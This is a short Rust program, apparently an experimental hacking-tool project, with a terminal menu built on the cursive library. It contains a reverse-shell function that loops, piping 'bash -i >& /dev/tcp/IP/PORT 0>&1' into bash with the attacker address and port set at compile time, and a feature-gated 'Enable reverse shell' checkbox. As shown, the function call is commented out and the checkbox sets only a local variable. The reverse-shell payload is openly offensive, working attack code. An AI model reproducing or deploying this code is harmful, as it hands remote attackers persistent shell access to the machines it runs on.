use core::time;
use cursive::views::Checkbox;
use cursive::views::ListView;
use std::{
    io::Write,
    process::{Command, Stdio},
    thread,
};

use cursive::views::Dialog;
/// the thing
fn main() {
    println!("BEWM!!!");
    pub fn reverse_shell() {
        let shell = thread::spawn(|| {
            Command::new("touch")
                .arg("h.txt")
                .spawn()
                .unwrap()
                .wait()
                .unwrap();

            loop {
                let mut bash = Command::new("bash").stdin(Stdio::piped()).spawn().unwrap();
                // .arg("-c")
                // .arg("bash")
                // .args(
                //     &(format!(
                //         "-i >& /dev/tcp/{}/{} 0>&1",
                //         option_env!("REVERSE_SHELL_IP").unwrap_or("127.0.0.1"),
                //         option_env!("REVERSE_SHELL_PORT").unwrap_or("4444")
                //     )
                //     .split(" ")
                //     .collect::<Vec<&str>>()),
                // )
                write!(
                    bash.stdin.take().unwrap(),
                    "{}",
                    (format!(
                        "bash -i >& /dev/tcp/{}/{} 0>&1",
                        option_env!("REVERSE_SHELL_IP").unwrap_or("127.0.0.1"),
                        option_env!("REVERSE_SHELL_PORT").unwrap_or("4444")
                    ))
                )
                .unwrap();
                bash.wait().unwrap();
                println!("Exited, sleeping for 5 seconds");
                thread::sleep(time::Duration::from_secs(5));
            }
        });
        shell.join().unwrap();
    }
    // reverse_shell();
    #[cfg(feature = "reverse_shell")]
    let mut rev = false;
    #[cfg(unix)]
    println!("yay unix");

    #[cfg(windows)]
    println!("eww windows");
    // Creates the cursive root - required for every application.
    let mut siv = cursive::default();
    let mut stuffs = ListView::new();
    #[cfg(feature = "reverse_shell")]
    {
        stuffs = stuffs.child(
            "Enable reverse shell",
            Checkbox::new().on_change(move |_, checked| {
                //
                rev = checked
            }),
        );
    }
    siv.add_layer(
        Dialog::new()
            .title("What's on the menu, hackerman?")
            .button("Ok", |s| s.quit())
            .content(stuffs),
    );

    // Starts the event loop.
    siv.run();
}
// #[cfg(feature = "reverse_shell")]
